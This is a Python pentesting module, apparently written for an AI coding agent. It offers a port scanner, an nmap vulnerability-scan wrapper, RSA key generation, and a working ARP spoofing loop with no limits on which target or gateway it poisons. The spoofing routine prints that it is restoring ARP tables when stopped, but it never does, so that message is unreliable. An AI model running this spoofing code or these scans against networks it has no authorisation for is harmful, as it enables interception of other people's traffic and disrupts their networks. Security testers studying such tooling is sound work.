"""
prototypes/pentesting_prototypes.py
Pentesting Prototypes Module

This module provides experimental features for penetration testing, vulnerability scanning,
and security assessments. Designed for integration into Devin, these prototypes are meant
to test and refine advanced techniques for ethical hacking.

"""

import os
import subprocess
import socket
from scapy.all import *
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

class PentestingPrototypes:
    """
    A class that contains experimental pentesting tools for ethical hacking.
    """

    def __init__(self):
        self.scan_results = {}

    def port_scan(self, target, ports=range(1, 1025)):
        """
        Perform a basic TCP port scan.

        Args:
            target (str): The IP or hostname to scan.
            ports (range): The range of ports to scan. Default is 1-1024.

        Returns:
            dict: A dictionary with open ports and their status.
        """
        print(f"Starting port scan on {target}")
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    if s.connect_ex((target, port)) == 0:
                        self.scan_results[port] = "Open"
                        print(f"Port {port} is open.")
                    else:
                        self.scan_results[port] = "Closed"
            except Exception as e:
                print(f"Error scanning port {port}: {e}")
        return self.scan_results

    def arp_spoof(self, target_ip, gateway_ip):
        """
        Perform an ARP spoofing attack (for educational purposes only).

        Args:
            target_ip (str): The target's IP address.
            gateway_ip (str): The gateway's IP address.
        """
        def get_mac(ip):
            ans, _ = arping(ip, timeout=2, verbose=0)
            for _, rcv in ans:
                return rcv[Ether].src
            return None

        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            print("Failed to fetch MAC addresses. Exiting...")
            return

        print(f"ARP spoofing target: {target_ip} ({target_mac}) via gateway: {gateway_ip} ({gateway_mac})")
        try:
            while True:
                send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
                send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=0)
        except KeyboardInterrupt:
            print("ARP spoofing stopped. Restoring ARP tables...")

    def generate_rsa_keys(self, key_size=2048):
        """
        Generate an RSA key pair.

        Args:
            key_size (int): The size of the RSA key. Default is 2048 bits.

        Returns:
            tuple: The private key and public key as PEM-encoded strings.
        """
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=key_size,
            backend=default_backend()
        )
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        public_pem = private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return private_pem.decode(), public_pem.decode()

    def vulnerability_scan(self, target):
        """
        Scan for common vulnerabilities using Nmap.

        Args:
            target (str): The IP or hostname to scan.

        Returns:
            str: The results of the vulnerability scan.
        """
        print(f"Running Nmap vulnerability scan on {target}...")
        try:
            result = subprocess.run(["nmap", "-sV", "--script=vuln", target],
                                     stdout=subprocess.PIPE, text=True)
            return result.stdout
        except FileNotFoundError:
            return "Nmap is not installed on this system."

if __name__ == "__main__":
    pentest = PentestingPrototypes()
    print("=== Pentesting Prototypes ===")
    print("1. Port Scan")
    print("2. ARP Spoofing")
    print("3. Generate RSA Keys")
    print("4. Vulnerability Scan")

    choice = input("Select an option: ")
    if choice == "1":
        target = input("Enter the target IP or hostname: ")
        pentest.port_scan(target)
    elif choice == "2":
        target_ip = input("Enter the target IP address: ")
        gateway_ip = input("Enter the gateway IP address: ")
        pentest.arp_spoof(target_ip, gateway_ip)
    elif choice == "3":
        private_key, public_key = pentest.generate_rsa_keys()
        print(f"Private Key:\n{private_key}")
        print(f"Public Key:\n{public_key}")
    elif choice == "4":
        target = input("Enter the target IP or hostname: ")
        print(pentest.vulnerability_scan(target))
    else:
        print("Invalid option. Exiting...")
